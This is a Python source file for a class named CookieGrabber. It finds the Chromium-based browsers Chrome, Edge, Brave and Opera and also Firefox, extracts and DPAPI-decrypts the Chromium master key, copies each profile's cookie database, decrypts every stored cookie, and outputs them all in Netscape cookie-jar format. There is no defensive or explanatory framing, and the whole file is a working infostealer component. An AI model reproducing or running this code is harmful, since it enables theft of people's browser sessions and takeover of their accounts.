import os
import json
import base64
import sqlite3
import shutil
import pathlib
import random
import string
from Crypto.Cipher import AES
import win32crypt

class CookieGrabber:
    def __init__(self):
        self.local = pathlib.Path(os.environ['LOCALAPPDATA'])
        self.roaming = pathlib.Path(os.environ['APPDATA'])
        self.temp = pathlib.Path(os.environ['TEMP'])
        self.chromium_targets = {
            "Chrome": self.local / "Google/Chrome/User Data",
            "Edge": self.local / "Microsoft/Edge/User Data",
            "Brave": self.local / "BraveSoftware/Brave-Browser/User Data",
            "Opera": self.roaming / "Opera Software/Opera Stable",
            "Opera GX": self.local / "Opera Software/Opera GX Stable"
        }

    def get_master_key(self, path):
        try:
            with open(path / "Local State", "r", encoding="utf-8") as f:
                key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except: return None

    def decrypt_cookie(self, buff, master_key):
        try:
            iv, payload = buff[3:15], buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()
        except: return ""

    def run(self):
        cookies = []
        for name, path in self.chromium_targets.items():
            key = self.get_master_key(path)
            if not key: continue
            for profile in ['Default'] + [p.name for p in path.glob("Profile *")]:
                db = path / profile / "Network" / "Cookies"
                if not db.exists(): db = path / profile / "Cookies"
                if db.exists():
                    tmp = self.temp / f"c{os.getpid()}{random.randint(1,999)}.db"
                    shutil.copy2(db, tmp)
                    conn = sqlite3.connect(tmp)
                    for host, n, val in conn.execute("SELECT host_key, name, encrypted_value FROM cookies"):
                        dec = self.decrypt_cookie(val, key)
                        cookies.append(f"{host}\tTRUE\t/\tFALSE\t2597573456\t{n}\t{dec}")
                    conn.close()
                    os.remove(tmp)

        ff_path = self.roaming / "Mozilla/Firefox/Profiles"
        for prof in ff_path.glob("*.default*"):
            cookie_db = prof / "cookies.sqlite"
            if cookie_db.exists():
                tmp = self.temp / f"ffc{os.getpid()}.db"
                shutil.copy2(cookie_db, tmp)
                conn = sqlite3.connect(tmp)
                for host, n, val in conn.execute("SELECT host, name, value FROM moz_cookies"):
                    cookies.append(f"{host}\tTRUE\t/\tFALSE\t2597573456\t{n}\t{val}")
                conn.close()
                os.remove(tmp)
        return cookies